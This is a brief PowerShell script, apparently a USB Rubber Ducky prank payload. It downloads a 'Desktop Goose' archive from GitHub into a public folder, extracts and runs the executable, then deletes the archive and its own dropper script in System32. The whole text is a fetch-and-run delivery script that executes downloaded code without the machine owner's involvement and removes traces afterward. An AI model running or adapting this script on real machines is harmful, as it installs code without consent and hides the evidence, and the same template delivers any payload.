cd C:\Users\Public\
wget "https://github.com/csandoval63/GooseDesktopRubberDucky/blob/master/Desktop%20Goose%20v0.21.zip?raw=true" -outfile "Goose.zip"
Expand-Archive .\Goose.zip
cd Goose
.\GooseDesktop.exe
cd ..
Remove-Item .\Goose.zip
cd C:\Windows\System32
Remove-Item .\helloGoose.ps1
exit
